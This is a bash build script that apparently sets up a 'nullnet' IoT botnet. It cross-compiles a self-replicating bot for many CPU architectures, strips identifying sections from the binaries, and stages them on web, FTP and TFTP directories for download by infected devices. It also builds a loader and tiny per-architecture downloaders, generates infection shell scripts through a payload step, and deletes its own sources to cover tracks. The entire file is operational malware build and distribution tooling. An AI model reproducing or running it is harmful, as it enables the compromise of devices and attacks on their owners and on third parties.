#!/bin/bash

export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

export GOROOT=/usr/local/go
export GOPATH=$HOME/project/nullnet
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

function compile_bot {
	"$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DNULLNET_BOT_ARCH=\""$1"\"
	"$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
																																																			   
function arc_compile {
	"$1-linux-gcc" -DNULLNET_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}

function compile_armv7 {
	"$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DNULLNET_BOT_ARCH=\""$1"\"
}
																																													  
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/nullnet_bin_dir

go build -o loader/scanListen scanListen.go

echo "Compiling - i486"
compile_bot i486 nullnet_load.i486 "-static -DNULLNET_SELF_REP"

echo "Compiling - x86"
compile_bot i586 nullnet_load.x86 "-static -DNULLNET_SELF_REP"

echo "Compiling - i686"
compile_bot i686 nullnet_load.i686 "-static -DNULLNET_SELF_REP"

echo "Compiling - X86_64"
compile_bot x86_64 nullnet_load.x86_64 "-static -DNULLNET_SELF_REP"

echo "Compiling - MIPS"
compile_bot mips nullnet_load.mips "-static -DNULLNET_SELF_REP"

echo "Compiling - MIPSEL"
compile_bot mipsel nullnet_load.mpsl "-static -DNULLNET_SELF_REP"

echo "Compiling - ARM/ARMv4"
compile_bot armv4l nullnet_load.arm "-static -DNULLNET_SELF_REP"

echo "Compiling - ARMv5"
compile_bot armv5l nullnet_load.arm5 " -DNULLNET_SELF_REP"

echo "Compiling - ARMv6"
compile_bot armv6l nullnet_load.arm6 "-static -DNULLNET_SELF_REP"

echo "Compiling - ARMv7"
compile_armv7 armv7l nullnet_load.arm7 "-static -DNULLNET_SELF_REP"

echo "Compiling - POWERPC"
compile_bot powerpc nullnet_load.ppc "-static -DNULLNET_SELF_REP"

echo "Compiling - SPARC"
compile_bot sparc nullnet_load.spc "-static -DNULLNET_SELF_REP"

echo "Compiling - M68K"
compile_bot m68k nullnet_load.m68k "-static -DNULLNET_SELF_REP"

echo "Compiling - SH4"
compile_bot sh4 nullnet_load.sh4 "-static -DNULLNET_SELF_REP"

echo "Compiling - ARC"
arc_compile arc nullnet_load.arc "-static -DNULLNET_SELF_REP"

compile_bot x86_64 debug.dbg "-static -DDEBUG -DNULLNET_SELF_REP"

mv release/*.dbg /root/
mv *dbg debug.amd64
cp release/nullnet_load.* /var/www/html/nullnet_bin_dir/
cp release/nullnet_load.* /var/ftp
cp release/nullnet_load.* /var/lib/tftpboot
rm -rf release
rm -rf /var/www/html/nullnet_bin_dir/*dbg

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

echo "reboot" > ~/dlr/release/dlr.arc
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc

mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/project ~/build.sh

touch /var/www/html/index.html
touch /var/www/html/nullnet_bin_dir/index.html
touch /var/www/html/index.html

python ~/stuff/payload.py
cp /var/www/html/nullnet_bash.sh /var/www/html/cache
sed -i 's/ssh.exploit/cache.exploit/g' /var/www/html/cache

cp /var/www/html/nullnet_bash.sh /var/www/html/cometome
sed -i 's/ssh.exploit/rooted/g' /var/www/html/cometome
mv ~/stuff/api.php ~/
rm -rf ~/stuff
rm -rf ~/setup.txt